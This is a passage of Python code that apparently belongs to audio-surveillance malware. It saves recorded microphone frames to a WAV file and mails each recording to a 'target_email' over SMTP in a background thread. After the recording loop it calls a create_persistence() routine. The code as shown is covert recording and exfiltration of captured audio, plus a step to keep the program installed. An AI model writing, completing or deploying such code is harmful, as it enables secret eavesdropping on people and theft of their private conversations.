            wf = wave.open(output_file, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(sample_format))
            wf.setframerate(fs)
            wf.writeframes(b''.join(frames))
            wf.close()

            threading.Thread(target=send_email, args=(smtp_server, smtp_port, email_user, email_pass, target_email, output_file)).start()
            frames.clear()

    stream.stop_stream()
    stream.close()
    p.terminate()
    create_persistence()
